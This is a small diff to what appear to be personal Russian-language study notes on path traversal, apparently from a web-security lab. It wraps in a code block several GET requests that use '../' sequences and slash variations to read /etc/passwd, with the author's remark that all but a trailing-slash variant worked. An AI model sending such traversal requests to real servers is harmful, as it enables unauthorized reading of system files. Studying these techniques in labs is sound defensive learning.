@@ -17,12 +17,14 @@ GET /image?filename=../../../etc/passwd
 
 
 *интересное для себя заметил, что все эти варианты дали полож  одинаковый результат:
+```http
 GET /image?filename=../../../etc/passwd
 GET /image?filename=/../../../etc/passwd 
 GET /image?filename=////..////..///..//////etc/passwd
 GET /image?filename=//////////../../../etc/passwd
 
 GET /image?filename=../../../etc/passwd/ - в конце слеш ломет запрос
+```
 
 ---
 
